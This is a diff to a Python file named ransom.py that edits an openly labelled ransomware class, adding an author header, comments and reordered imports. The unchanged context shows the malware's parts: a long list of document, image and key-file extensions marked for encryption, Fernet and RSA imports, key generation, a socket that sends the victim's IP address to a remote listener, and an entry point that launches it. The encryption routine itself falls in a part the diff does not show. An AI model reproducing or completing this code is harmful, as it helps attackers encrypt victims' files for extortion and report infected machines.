@@ -1,12 +1,16 @@
+# __Author__ __Lencof__
+# ransom.py
+
 import os
-import requests
 import socket
+import requests
 import threading
 from pathlib import Path
 from cryptography.fernet import Fernet
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 
+# files for encryption
 file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                   '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1',
                   '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc',
@@ -20,10 +24,12 @@ file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                   '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                   '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der')
 
+
 def download_gui():
     # Download GUI
     pass
 
+# create class Ransomware():  
 class Ransomware:
     def __init__(self):
         self.key = Fernet.generate_key()
@@ -74,4 +80,4 @@ class Ransomware:
         self.sock.send(f'{socket.gethostbyname(socket.gethostname())}'.encode())
 
 if __name__ == '__main__':
-    Ransomware()
+    Ransomware() # exit()
